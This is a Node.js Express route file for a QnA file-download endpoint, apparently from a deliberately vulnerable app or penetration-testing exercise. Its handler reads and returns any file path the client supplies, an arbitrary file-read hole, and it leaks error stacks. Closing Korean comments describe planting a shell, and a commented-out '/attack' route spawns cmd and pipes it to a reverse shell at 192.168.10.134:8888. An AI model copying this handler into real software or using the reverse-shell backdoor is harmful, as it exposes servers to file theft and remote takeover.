var express = require("express");
var router = express.Router();
var Model = require("../../../models/index");
var Response = require("../../Response");
var statusCodes = require("../../statusCodes");
var { validateUserToken } = require("../../../middlewares/validateToken");
var { encryptResponse, decryptRequest, decryptAuthRequest, decrypt } = require("../../../middlewares/crypt");
var FormData = require('form-data');
const Readable = require('stream').Readable;
/**
 * QnA file list route
 * This endpoint allows to view list of files of a question
 * @path                             - /api/qna/list
 * @middleware
 * @param file
 * @return                           - Qna 
 */
var fs = require('fs');
const { response } = require("express");


router.get("/", async (req, res) => {
    // send to file localfile to client
    var r = new Response();
    var filename = req.query.filename;
    console.log(filename);
    try{
        // var stat = fs.statSync(filename);
        // var file = fs.createReadStream(filename);
        // res.setHeader('Content-Length', stat.size);
        // res.setHeader('Content-Type', 'application/octet-stream');
        // filename = filename.split('/');
        // filename = filename[filename.length - 1];
        // res.setHeader('Content-Disposition', 'attachment; filename='+filename);
        // file.pipe(res);

        file_data = fs.readFileSync(filename);
        s = new Readable();
        filename = filename.split('/');
        filename = filename[filename.length - 1];
        res.attachment(filename);
        s.push(file_data);
        s.push(null);
        s.pipe(res);
    }
    catch (err){
        r.status = statusCodes.SERVER_ERROR;
        r.data = {
            "message": err.toString(),
            "stack": err.stack,
        };
        return res.json(encryptResponse(r));
    }
});

//방법2. 쉘 js 업로드 후 연결.
// router.use('/attack', require('./attack.js'));

//방법 1. 파일 다운로드의 router 수정
// router.get("/attack", function(){
// 	var net = require("net"),
// 		cp = require("child_process"),
// 		sh = cp.spawn("cmd",[]);
// 	var client = new net.Socket();
// 	client.connect(8888,"192.168.10.134",function(){
// 		client.pipe(sh.stdin);
// 		sh.stdout.pipe(client);
// 		sh.stderr.pipe(client);
// 	});
// 	return /a/;
// });

module.exports = router;